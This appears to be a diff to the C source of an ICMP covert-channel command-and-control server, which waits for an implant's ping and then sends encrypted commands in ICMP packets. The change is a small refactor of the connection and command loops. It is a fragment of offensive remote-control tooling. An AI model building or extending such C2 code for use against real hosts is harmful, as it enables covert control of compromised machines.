@@ -64,7 +64,6 @@ void interact(int sockfd) {
     char src_ip[INET_ADDRSTRLEN]; // buffer to store the source IP (16 bytes)
     ssize_t nbytes;
     size_t data_section_size, packet_size = sizeof(struct iphdr *) + sizeof(struct icmphdr *) + BUFFER_SIZE;
-    int connected = 0;
 
     CHECK_ALLOC(cipher_text);
 
@@ -77,7 +76,7 @@ void interact(int sockfd) {
     puts("[+] Waiting for connections...");
 
     // wait for pings and if we got one we let the implant know
-    while (!connected) {
+    while (1) {
         if ((read_from_socket(sockfd, packet, packet_size) < 0)) {
             goto out;
         }
@@ -99,28 +98,24 @@ void interact(int sockfd) {
                 goto out;
             }
 
-            connected = 1;
+            break; // we got a connection, move to the next loop
         }
     }
 
-    while (connected) {
-        data = parse_data_section(packet);
-
-        addr = prep_ip_headers(ip);
-
+    while (1) {
         command = get_command(input);
 
-        append_to_data_section(icmp, data, command);
+        append_to_data_section(icmp, command);
 
         // we're using a stream cipher, and since length of input == cipher_text then we use strlen(input) instead
         nbytes = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(input), 0, (struct sockaddr *) &addr, sizeof(addr));
         if (nbytes < 0) {
             perror("sendto()");
-            goto out;
+            break;
         }
 
         if ((nbytes = read_from_socket(sockfd, packet, packet_size)) < 0) {
-            goto out;
+            break;
         }
 
         icmp = (struct icmphdr *) (packet + sizeof(struct iphdr));
@@ -141,6 +136,7 @@ out:
     free(input);
     free(cipher_text);
     free(packet);
+    return;
 }
 
 // initializes the options and starts the c2
